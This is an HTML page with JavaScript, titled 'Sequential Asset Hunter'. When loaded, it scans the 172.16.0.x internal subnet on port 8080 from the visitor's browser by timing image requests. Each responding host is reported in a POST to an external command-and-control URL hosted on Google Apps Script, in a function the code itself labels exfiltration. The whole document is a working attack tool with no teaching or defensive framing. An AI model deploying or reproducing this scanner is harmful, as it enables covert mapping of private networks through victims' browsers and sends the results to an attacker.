<!DOCTYPE html>
<html>
<head>
    <title>Sequential Scanner</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; font-size: 14px; }
        .highlight { color: #fff; font-weight: bold; background: #004400; padding: 2px 5px; }
        .current { color: #ff0; }
        #results { margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
    </style>
</head>
<body>
    <h1>// SEQUENTIAL ASSET HUNTER //</h1>
    <div>TARGET PORT: 8080 (Chrome Controller)</div>
    <div id="status" class="current">Initializing Queue...</div>
    
    <div id="results"></div>

    <script>
        // --- CONFIG ---
        var C2_URL = "https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID_HERE/exec"; 
        var TARGET_PORT = 8080;
        var SUBNET = '172.16.0.';
        
        // We will scan these IPs. 
        // We prioritize .181 (your known IP) to prove it works immediately.
        // Then we scan the rest.
        var queue = [181]; 
        for(var i=1; i<255; i++) {
            if(i !== 181) queue.push(i);
        }

        // --- EXFILTRATION ---
        function reportHit(ip) {
            var msg = "!!! TARGET CONFIRMED: " + ip + " !!!";
            document.getElementById('results').innerHTML += "<div class='highlight'>" + msg + "</div>";
            
            fetch(C2_URL, {
                method: "POST",
                mode: "no-cors",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    type: "HIT",
                    ip: ip,
                    port: TARGET_PORT
                })
            });
        }

        // --- SCANNER LOGIC ---
        function processQueue() {
            if(queue.length === 0) {
                document.getElementById('status').innerText = "SCAN COMPLETE.";
                return;
            }

            var currentOctet = queue.shift();
            var ip = SUBNET + currentOctet;
            
            document.getElementById('status').innerText = "Scanning: " + ip + "...";

            var img = new Image();
            var timer = null;

            // MOVE TO NEXT IP FUNCTION
            var next = function() {
                if(timer) clearTimeout(timer);
                processQueue(); // Recursive call to process next item
            };

            // SUCCESS HANDLER (Load or Error = Port Open)
            var onSuccess = function() {
                reportHit(ip);
                next();
            };

            img.onload = onSuccess;
            img.onerror = onSuccess; // "Chrome controller" text will trigger this

            // TIMEOUT HANDLER (Port Closed / Host Down)
            timer = setTimeout(function() {
                img.src = ""; // Kill pending request
                // We don't report failures, just move on
                next();
            }, 2000); // 2 Seconds per IP is safe for sequential

            // FIRE
            img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
        }

        // START
        processQueue();

    </script>
</body>
</html>
